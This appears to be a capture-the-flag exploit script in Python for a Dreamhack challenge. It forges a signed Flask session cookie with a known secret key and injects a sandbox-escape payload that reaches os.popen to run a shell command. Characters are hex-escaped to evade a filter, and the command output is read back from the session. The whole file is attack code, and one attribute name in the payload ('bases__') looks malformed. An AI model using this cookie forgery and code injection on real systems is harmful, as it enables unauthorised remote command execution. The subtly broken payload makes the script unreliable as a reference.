# 상관 없는 코드 입니다.

from flask import Flask, session
from flask.sessions import SecureCookieSessionInterface
import requests


def getDecodedData(SECRET_KEY, code):
    app = Flask(__name__)
    app.secret_key = SECRET_KEY
    serial = SecureCookieSessionInterface().get_signing_serializer(app)
    target = "http://host1.dreamhack.games:14708/"
    cookie = {"session": serial.dumps(code)}
    req = requests.get(target, cookies=cookie)
    _dict = serial.loads(req.cookies['session'])
    return _dict['domdomi'].decode()


if __name__ == "__main__":
    SECRET_KEY = "[REDACTED]"
    ingredient = "domdom"
    measurements = """1;\
    exec "i={}.__class__.bases__[0].__subclasses__()[59]()._module.__builtins__[\'__import__\'];\
    i(\'flask\').session[\'domdomi\']=i(\'os\').popen(\'ls -al\').read()\""""
    encoded = measurements.replace("[", "\\x5b",).replace(
        "(", "\\x28").replace(".", "\\x2e").replace("_", "\\x5f")
    decoded = getDecodedData(SECRET_KEY, {
        'ingredient': ingredient,
        'measurements': encoded
    })
    print(decoded)
